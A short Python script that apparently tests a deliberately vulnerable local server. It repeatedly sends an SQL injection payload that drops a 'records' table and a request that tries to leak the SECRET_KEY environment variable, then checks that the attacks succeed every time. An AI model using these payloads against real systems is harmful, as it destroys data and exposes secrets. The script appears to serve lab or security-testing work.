import requests
import sys
import time

import requests
import sys
import time
import json
import re

ATTACK_URL = "http://127.0.0.1:8000/attack"

success = 0
attempts = 10

for i in range(attempts):
    print(f"\n[CLIENT][ATTACK] Attempt {i+1} - SQL Injection")
    payload = {
        "attack_type": "sqli",
        "payload": {
            "name": f"attacker{i}', 'exploit st'); DROP TABLE records;--",
            "address": "hacked"
        }
    }
    try:
        resp = requests.post(ATTACK_URL, json=payload, timeout=10)
        print(f"[CLIENT][POST] SQLi attack response: {resp.status_code} {resp.text}")
        if '"sqli": "success"' in resp.text or 'no such table' in resp.text.lower():
            print("[CLIENT][SUCCESS] SQLi attack succeeded!")
            success += 1
        else:
            print("[CLIENT][FAIL] SQLi did not succeed.")
    except Exception as e:
        print(f"[CLIENT][ERROR] Exception in SQLi attack: {e}")

    print(f"[CLIENT][ATTACK] Attempt {i+1} - Env Leak")
    payload = {
        "attack_type": "env",
        "var_name": "SECRET_KEY"
    }
    try:
        resp = requests.post(ATTACK_URL, json=payload, timeout=10)
        print(f"[CLIENT][POST] Env variable response: {resp.status_code} {resp.text}")
        if 'Not found' not in resp.text and resp.text.strip() != '""':
            print("[CLIENT][SUCCESS] Env leak attack may have succeeded!")
            success += 1
    except Exception as e:
        print(f"[CLIENT][ERROR] Exception in get_env_variable POST: {e}")

success_rate = 100.0 * success / (2 * attempts)
print(f"\n[CLIENT] Attack success rate: {success_rate:.1f}%")
if success_rate < 100.0:
    print("[CLIENT][WARN] Attack success rate is below 100%! Check server vulnerability.")
else:
    print("[CLIENT][INFO] 100% attack success rate achieved.")
